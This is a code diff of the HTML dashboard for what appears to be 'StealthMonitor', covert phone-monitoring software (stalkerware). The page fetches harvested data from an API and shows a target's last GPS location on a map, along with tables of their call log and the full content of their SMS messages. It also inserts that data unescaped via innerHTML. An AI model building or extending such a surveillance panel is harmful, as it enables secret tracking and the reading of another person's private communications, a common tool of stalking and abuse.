@@ -1,36 +1,102 @@
 <!DOCTYPE html>
-<html lang="pt">
+<html>
 <head>
-  <meta charset="UTF-8">
-  <title>StealthMonitor – Dashboard</title>
-  <meta name="viewport" content="width=device-width,initial-scale=1" />
-
-  <!-- Seu CSS -->
-  <link rel="stylesheet" href="css/style.css">
-
-  <!-- Leaflet CSS (local ou CDN) -->
-  <link
-    rel="stylesheet"
-    href="leaflet/leaflet.css"
-  />
+  <meta charset="utf-8" />
+  <title>Dashboard - StealthMonitor</title>
+  <link rel="stylesheet" href="https://unpkg.com/leaflet/dist/leaflet.css" />
   <style>
-    body, html { margin:0; height:100%; }
-    #map { display:none; width:100%; height:calc(100% - 40px); }
-    #msg {
-      height:40px; line-height:40px; text-align:center;
-      background:#fafafa; border-bottom:1px solid #ddd;
-    }
-    #logout { position:absolute; top:5px; right:5px; z-index:1000; }
+    body { font-family: sans-serif; margin: 0; padding: 0; }
+    #map { height: 300px; }
+    table { width: 100%; border-collapse: collapse; margin-top: 1em; }
+    th, td { border: 1px solid #ccc; padding: 8px; font-size: 14px; }
+    th { background: #f0f0f0; }
   </style>
 </head>
 <body>
-  <button id="logout">Logout</button>
-  <div id="msg">Inicializando dashboard…</div>
+  <h2>Dashboard StealthMonitor</h2>
+  <button onclick="logout()">Logout</button>
+  <button onclick="loadData()">🔄 Atualizar Dados</button>
+
+  <h3>🗺️ Localização</h3>
   <div id="map"></div>
 
-  <!-- Leaflet JS -->
-  <script src="leaflet/leaflet.js"></script>
-  <!-- Seu código de dashboard -->
-  <script src="js/dashboard.js"></script>
+  <h3>📞 Chamadas</h3>
+  <table id="callsTable">
+    <thead>
+      <tr><th>Nome</th><th>Telefone</th><th>Tipo</th><th>Duração</th><th>Timestamp</th></tr>
+    </thead>
+    <tbody></tbody>
+  </table>
+
+  <h3>✉️ SMS</h3>
+  <table id="smsTable">
+    <thead>
+      <tr><th>De</th><th>Para</th><th>Conteúdo</th><th>Timestamp</th></tr>
+    </thead>
+    <tbody></tbody>
+  </table>
+
+  <script src="https://unpkg.com/leaflet/dist/leaflet.js"></script>
+  <script>
+    const token = localStorage.getItem('token');
+    if (!token) location.href = '/';
+
+    const map = L.map('map').setView([0, 0], 2);
+    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
+
+    function logout() {
+      localStorage.removeItem('token');
+      location.href = '/';
+    }
+
+    async function loadData() {
+      try {
+        const res = await fetch('/api/data', {
+          headers: { Authorization: 'Bearer ' + token }
+        });
+        const data = await res.json();
+
+        const last = data[data.length - 1];
+        if (last?.location) {
+          map.setView([last.location.lat, last.location.lng], 14);
+          L.marker([last.location.lat, last.location.lng])
+            .addTo(map)
+            .bindPopup("Última Localização")
+            .openPopup();
+        }
+
+        const callsBody = document.querySelector('#callsTable tbody');
+        callsBody.innerHTML = '';
+        last.calls.forEach(call => {
+          const row = `<tr>
+            <td>${call.name}</td>
+            <td>${call.number}</td>
+            <td>${call.type}</td>
+            <td>${call.duration}</td>
+            <td>${new Date(call.timestamp).toLocaleString()}</td>
+          </tr>`;
+          callsBody.innerHTML += row;
+        });
+
+        const smsBody = document.querySelector('#smsTable tbody');
+        smsBody.innerHTML = '';
+        last.sms.forEach(msg => {
+          const row = `<tr>
+            <td>${msg.from}</td>
+            <td>${msg.to}</td>
+            <td>${msg.content}</td>
+            <td>${new Date(msg.timestamp).toLocaleString()}</td>
+          </tr>`;
+          smsBody.innerHTML += row;
+        });
+
+      } catch (err) {
+        alert("Erro ao carregar dados.");
+        console.error(err);
+      }
+    }
+
+    loadData();
+  </script>
 </body>
 </html>
